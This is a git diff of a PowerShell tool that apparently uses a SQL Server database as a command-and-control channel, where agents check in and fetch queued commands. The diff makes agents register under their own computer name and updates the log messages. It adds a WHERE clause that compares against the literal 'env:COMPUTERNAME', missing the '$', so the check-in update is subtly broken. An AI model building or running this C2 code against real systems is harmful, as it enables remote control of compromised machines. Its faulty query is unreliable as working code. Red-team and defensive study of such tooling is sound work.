@@ -798,10 +798,11 @@ Function Register-SQLC2Agent
         # Setup query to grab commands
         $Query = "
              -- checkin as agent
-            IF not Exists (SELECT * FROM dbo.C2Agents WHERE servername = 'NETSPI-419-SSU')
-	            INSERT dbo.C2Agents (servername) VALUES ('NETSPI-419-SSU')
+            IF not Exists (SELECT * FROM dbo.C2Agents WHERE servername = '$env:COMPUTERNAME')
+	            INSERT dbo.C2Agents (servername) VALUES ('$env:COMPUTERNAME')
             ELSE
-	        UPDATE dbo.C2Agents SET lastcheckin = (select GETDATE ())"
+	        UPDATE dbo.C2Agents SET lastcheckin = (select GETDATE ())
+            WHERE servername like 'env:COMPUTERNAME'"
 
         # Execute Query
         $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose
@@ -1042,7 +1043,7 @@ Function Set-SQLC2Command
             if( -not $SuppressVerbose)
             {
                 Write-Verbose -Message "$Instance : Connection Success."
-                Write-Verbose "$instance : Attempting to set command on C2 Server $env:COMPUTERNAME for $ServerName agent(s)."
+                Write-Verbose "$instance : Attempting to set command on C2 Server $Instance for $ServerName agent(s)."
                 Write-Verbose "$instance : Command: $Command"
             }
         }
@@ -1061,7 +1062,7 @@ Function Set-SQLC2Command
         # Execute Query
         $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose
 
-        Write-Verbose "$instance : Command added for $ServerName agent(s) on C2 server $env:COMPUTERNAME."
+        Write-Verbose "$instance : Command added for $ServerName agent(s) on C2 server $Instance."
     }
 
     End
@@ -1162,7 +1163,7 @@ Function Get-SQLC2Command
             if( -not $SuppressVerbose)
             {
                 Write-Verbose -Message "$Instance : Connection Success."
-                Write-Verbose "$instance : Attempting to grab command from $env:COMPUTERNAME ."
+                Write-Verbose "$instance : Attempting to grab command from $Instance."
             }
         }
         else
@@ -1186,7 +1187,7 @@ Function Get-SQLC2Command
         # check command count
         $CommandCount = $TblResults | measure | select count -ExpandProperty count
 
-        Write-Verbose "$instance : $CommandCount commands were from $env:COMPUTERNAME."
+        Write-Verbose "$instance : $CommandCount commands were from $Instance."
     }
 
     End
